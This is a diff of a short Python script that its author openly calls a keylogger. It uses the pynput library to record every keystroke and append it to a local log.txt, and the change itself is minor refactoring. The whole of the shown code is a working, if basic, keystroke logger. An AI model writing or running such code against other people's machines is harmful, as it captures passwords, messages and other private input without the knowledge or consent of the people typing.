@@ -6,12 +6,13 @@ Kinda self explanatory, but a keylogger written in python. Gonna work on making 
 
 # Imports
 from pynput.keyboard import Listener
+import os
+
+path = 'log.txt'
 
 def on_press(key):
-    with open('log.txt', 'a') as f:
+    with open(path, 'a') as f:
         f.write(str(key)+'\n')
 
 with Listener(on_press=on_press) as listener:
     listener.join()
-
-    hi
